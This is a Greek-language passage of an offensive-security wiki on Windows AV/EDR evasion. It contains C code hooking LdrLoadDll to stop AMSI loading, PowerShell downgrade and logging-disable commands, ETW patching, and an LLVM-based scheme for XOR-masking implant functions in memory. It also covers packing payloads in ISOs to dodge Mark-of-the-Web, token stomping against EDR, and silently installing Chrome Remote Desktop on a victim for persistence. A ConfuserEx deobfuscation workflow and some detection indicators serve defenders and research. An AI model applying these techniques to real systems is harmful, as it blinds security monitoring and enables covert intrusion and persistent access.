Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Μια ανθεκτική λύση παράκαμψης, ανεξάρτητη από τη γλώσσα, είναι η τοποθέτηση ενός hook σε επίπεδο χρήστη στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει ένα σφάλμα όταν η ζητούμενη λειτουργική μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για τη συγκεκριμένη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (ψευδοκώδικας x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί με PowerShell, WScript/CScript και custom loaders (οτιδήποτε θα φόρτωνε διαφορετικά το AMSI).
- Συνδυάστε το με αποστολή των scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), για να αποφύγετε μεγάλα ίχνη στη γραμμή εντολών.
- Έχει χρησιμοποιηθεί από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης scripts για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης scripts για παράκαμψη του AMSI που αποφεύγουν τις υπογραφές χρησιμοποιώντας τυχαιοποιημένες συναρτήσεις που ορίζονται από τον χρήστη, μεταβλητές και εκφράσεις χαρακτήρων, καθώς και τυχαία εναλλαγή πεζών και κεφαλαίων στα keywords του PowerShell.

**Αφαιρέστε την υπογραφή που εντοπίστηκε**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε από τη μνήμη της τρέχουσας διεργασίας την υπογραφή του AMSI που εντοπίστηκε. Το εργαλείο σαρώνει τη μνήμη της τρέχουσας διεργασίας για την υπογραφή του AMSI και στη συνέχεια την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποιήστε την έκδοση 2 του PowerShell**
Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PS

Η καταγραφή PowerShell είναι μια λειτουργία που καταγράφει όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Μπορεί να είναι χρήσιμη για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση του PowerShell Transcription και του Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρήση της έκδοσης 2 του PowerShell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση μη διαχειριζόμενης συνεδρίας PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Έτσι παρακάμπτετε τους ελέγχους που σχετίζονται ειδικά με τη διεργασία `powershell.exe`, αλλά αυτό δεν απενεργοποιεί εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από τον χρόνο εκτέλεσης και την υλοποίηση του host.


## Obfuscation

> [!TIP]
> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και, ενδεχομένως, να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να αποκρυφτούν.

### Απο-συσκότιση δυαδικών αρχείων .NET που προστατεύονται από το ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να συναντάτε πολλά επίπεδα προστασίας που εμποδίζουν decompilers και sandboxes. Η παρακάτω ροή εργασίας **αποκαθιστά αξιόπιστα ένα σχεδόν αρχικό IL**, το οποίο μπορεί στη συνέχεια να γίνει decompile σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1. Αφαίρεση anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Επίσης, τροποποιεί το PE checksum, ώστε οποιαδήποτε αλλαγή να προκαλεί κατάρρευση του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες μεταδεδομένων, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες για τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – δώστε το *καθαρό* αρχείο στο **de4dot-cex** (fork του de4dot που αναγνωρίζει το ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – επιλογή του profile ConfuserEx 2
     • το de4dot αναιρεί το control-flow flattening, επαναφέρει τα αρχικά namespaces, τις κλάσεις και τα ονόματα μεταβλητών και αποκρυπτογραφεί τις σταθερές συμβολοσειρές.

3.  Αφαίρεση proxy-call – το ConfuserEx αντικαθιστά τις άμεσες κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει ακόμη περισσότερο το decompilation.  Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το δυαδικό αρχείο που προκύπτει στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload.  Συχνά, το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Μία εντολή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), το οποίο προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από αλλοίωση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για τη δημιουργία obfuscated κώδικα κατά τη μεταγλώττιση, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated λειτουργιών, οι οποίες δημιουργούνται από το framework μεταπρογραμματισμού templates της C++ και δυσκολεύουν λίγο περισσότερο τη δουλειά όποιου θέλει να κάνει crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα αρχεία PE, όπως .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα εκτελέσιμα.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζονται από το LLVM, το οποίο χρησιμοποιεί ROP (return-oriented programming). Κάνει obfuscate ένα πρόγραμμα σε επίπεδο κώδικα assembly, μετατρέποντας τις κανονικές εντολές σε αλυσίδες ROP και ανατρέποντας τη φυσική αντίληψή μας για τη συνηθισμένη ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

### Αυτο-απόκρυψη ανά συνάρτηση με τη βοήθεια του LLVM compiler

Αντί να γίνεται masking σε ολόκληρο το implant μόνο όσο βρίσκεται σε αδράνεια, ένα τροποποιημένο LLVM X86 backend μπορεί να κρατά επιλεγμένες συναρτήσεις XOR-masked όποτε είναι ανενεργές. Το PoC Function Peekaboo επιλέγει demangled ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό κώδικα μηχανής και εκπέμπει έναν κοινό handler masking στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και η σύμβαση κλήσεων Windows x64 παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός ροής ελέγχου στο backend

Αυτό πρέπει να γίνει μετά την επιλογή εντολών και τη βελτιστοποίηση, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε εκπεμπόμενη εντολή επιστροφής** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο προσαρτημένο επίλογο και αντικαθιστά τις προηγούμενες εντολές επιστροφής με `JMP_1 handler`. Διατηρήστε κάθε teardown του stack/frame που παράγεται από τον compiler πριν από κάθε επιστροφή· ανακατευθύνετε μόνο την ίδια την εντολή επιστροφής.<sup>[[38]](#references)[[39]](#references)</sup>

Οι `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stubs ανά συνάρτηση, ενώ η `emitEndOfAsmFile()` εκπέμπει τον handler. Σύμβολα που είναι κοινά στα στάδια εκπομπής επιτρέπουν σε ένα branch του prologue να στοχεύει τον μεταγενέστερο επίλογό του. Για χειροκίνητη εκπομπή ενός near `je`, γράψτε `0F 84` και στη συνέχεια την τετρα-byte MC expression `target - address_after_je`. Οι κλήσεις και τα jumps προς τον handler μπορούν, αντί γι’ αυτό, να εκπεμφθούν ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μη επιλεγμένη συνάρτηση, αν δεν έχει αλλάξει τίποτα· το PoC επιστρέφει λανθασμένα `true` σε αυτήν την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα κλειδί XOR και εγγραφές 16 byte, οι οποίες περιέχουν έναν loader-relocated δείκτη συνάρτησης και ένα μήκος που υπολογίζεται κατά την εκτέλεση, στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στο offset `+8` της εγγραφής, καταναλώνοντας το μήκος και τα bytes padding του, και προχωρά στις εγγραφές ανά `0x10`. Τα ονόματα των PE sections έχουν μέγιστο μήκος οκτώ byte, οπότε η αναζήτηση κατά την εκτέλεση βλέπει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει το παλιό entry-point RVA στο stub και ανακατευθύνει το `AddressOfEntryPoint`. Το PIC stub λαμβάνει τη διεύθυνση βάσης της εικόνας από το `gs:[0x60]` → `[PEB+0x10]`, διατρέχει τα imports PE32+ για να επιλύσει ένα ήδη εισαγμένο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση ορίζει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση των metadata. Το μόνιμα αναγνώσιμο prologue καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει το sentinel και παραλείπει το σώμα που δεν έχει ακόμη γίνει clear. Στη συνέχεια, ο επίλογος χρησιμοποιεί `call handler`. Αφού ο handler αποθηκεύσει 13 registers (`0x68` bytes), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της μετασχηματισμένης συνάρτησης, οπότε το `end - start` μπορεί να γραφτεί στην εγγραφή των metadata. Το stub εκκαθαρίζει το sentinel και κάνει jump στο `ImageBase + original_entry_point_RVA` αφού γίνουν mask όλα τα σώματα.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη συνηθισμένη κλήση, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή συνεχίζει στον προσαρτημένο επίλογο, ενώ κάθε προηγούμενη επιστροφή κάνει jump απευθείας στον κοινό handler. Και ο συνηθισμένος επίλογος χρησιμοποιεί `jmp handler` αντί για `call`, οπότε, μετά το re-masking, το `ret` του handler καταναλώνει τη διεύθυνση επιστροφής του αρχικού caller και διατηρεί το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking και δείκτες ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερό ορατό prologue (μήκους `0x46` bytes σε αυτό το build), αλλάζει την υπόλοιπη περιοχή σε `PAGE_EXECUTE_READWRITE`, εφαρμόζει XOR byte προς byte με το χαμηλό byte του κλειδιού και στη συνέχεια την ορίζει σε `PAGE_EXECUTE_READ`. Επομένως, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά την κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Σημαντικοί δείκτες για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point μέσα σε εκτελέσιμο `.stub` και section `.funcmet` που περιέχει ένα κλειδί μαζί με relocated δείκτες προς το `.text`,
- parsing του PEB, του import table και του section table πριν από το CRT, ακολουθούμενο από κλήσεις μέσω κάθε δείκτη των metadata,
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά σημεία επιστροφής που ανακατευθύνονται σε έναν handler,
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες αλλαγές προστασίας μέσω `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από την εικόνα.

Πρόκειται για αποφυγή memory scanner, όχι για κρυπτογραφική προστασία: το patched αρχείο εξακολουθεί να περιέχει το αρχικό σώμα σε clear μορφή, ενώ ένας debugger μπορεί να σταματήσει στο `VirtualProtect` ή στον βρόχο XOR και να κάνει dump την ενεργή συνάρτηση. Το XOR ενός byte, τα αναγνώσιμα metadata και το σταθερό όριο `0x46` κάνουν επίσης εύκολη την ανάκτηση offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Τα TEB slots του PoC είναι thread-local, αλλά οι τροποποιημένες σελίδες κώδικα είναι κοινές για όλη τη διεργασία. Επομένως, ταυτόχρονες ή αναδρομικές είσοδοι μπορούν να αλλάξουν ξανά τις εντολές ενώ εκτελείται άλλη κλήση· εξαιρέσεις και μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το re-masking. Μια ανθεκτική υλοποίηση πρέπει να συγχρονίζει τις μεταβάσεις, να επαναφέρει την προστασία που επιστρέφεται μέσω του `lpflOldProtect`, να αποφεύγει hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` ως προς την ευθυγράμμιση stack στο x64 και να καλεί `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων bytes. Η Microsoft ορίζει ρητά ότι ο caller είναι υπεύθυνος για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Ίσως να έχετε δει αυτήν την οθόνη όταν κατεβάζετε ορισμένα εκτελέσιμα από το διαδίκτυο και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που αποσκοπεί στην προστασία του τελικού χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη: εφαρμογές που δεν κατεβαίνουν συχνά θα ενεργοποιήσουν το SmartScreen, το οποίο ειδοποιεί τον τελικό χρήστη και εμποδίζει την εκτέλεση του αρχείου (αν και το αρχείο μπορεί να εκτελεστεί πατώντας More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με τη διεύθυνση URL από την οποία έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που λήφθηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα που έχουν υπογραφεί με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε την προσθήκη Mark of The Web στα payloads σας είναι να τα συσκευάσετε σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε containers εξόδου για να παρακάμπτει το Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί demo για την παράκαμψη του SmartScreen, συσκευάζοντας payloads μέσα σε αρχεία ISO με το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως ακριβώς απενεργοποιείται (παρακάμπτεται) το AMSI, είναι επίσης δυνατό να κάνουμε τη συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως, χωρίς να καταγράφει κανένα συμβάν. Αυτό γίνεται με την τροποποίηση της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί εξαιρετικό τρόπο εκτέλεσης των post-exploitation εργαλείων σας χωρίς να σας εντοπίσει το AV.

Καθώς το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να ανησυχήσουμε μόνο για την τροποποίηση του AMSI σε ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Περιλαμβάνει **την εκκίνηση μιας νέας sacrificial διεργασίας**, την έγχυση του κακόβουλου post-exploitation κώδικά σας σε αυτή τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικά σας και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτή η μέθοδος έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι, αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια της post-exploitation ενέργειάς μας, είναι **πολύ πιθανότερο** να **επιβιώσει το implant μας**. Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **συμπεριφορικούς μηχανισμούς εντοπισμού**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την έγχυση του κακόβουλου post-exploitation κώδικα **στη δική του διεργασία**. Έτσι, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τη σάρωσή της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Χρήση Άλλων Γλωσσών Προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες, παρέχοντας στο παραβιασμένο μηχάνημα πρόσβαση **στο περιβάλλον του interpreter που είναι εγκατεστημένο στο SMB share που ελέγχει ο Attacker**.

Παρέχοντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον που βρίσκεται στο SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες, μέσα στη μνήμη** του παραβιασμένου μηχανήματος.

Το repo αναφέρει: το Defender εξακολουθεί να σαρώνει τα scripts, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη στατικών signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες είχαν επιτυχία.

## TokenStomping

Το Token stomping τροποποιεί το access token ενός προϊόντος ασφαλείας, όπως ένα EDR ή AV. Η μείωση των δικαιωμάτων του token μπορεί να αφήσει τη διεργασία σε λειτουργία, ενώ την εμποδίζει να εκτελεί προνομιακές ενέργειες επιθεώρησης ή αποκατάστασης.

Για να το αποτρέψει αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** από το να λαμβάνουν handles στα tokens των διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση Έμπιστου Λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτή την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός θύματος και στη συνέχεια να το χρησιμοποιήσετε για να αποκτήσετε τον έλεγχο και να διατηρήσετε την persistence:<sup>[[35]](#references)</sup>
1. Κάντε λήψη από το https://remotedesktop.google.com/, πατήστε «Set up via SSH» και, στη συνέχεια, πατήστε το αρχείο MSI για Windows, ώστε να γίνει λήψη του MSI αρχείου.
2. Εκτελέστε σιωπηλά το πρόγραμμα εγκατάστασης στο σύστημα του θύματος (απαιτούνται δικαιώματα διαχειριστή): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και πατήστε next. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε τη σύνδεση· πατήστε το κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαραίτητες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση του GUI).
 

## Προηγμένες Τεχνικές Αποφυγής Εντοπισμού

Η αποφυγή εντοπισμού είναι ένα πολύ περίπλοκο θέμα. Μερικές φορές πρέπει να λαμβάνετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο επιχειρείτε να αποκτήσετε πρόσβαση έχει τα δικά του πλεονεκτήματα και αδυναμίες.

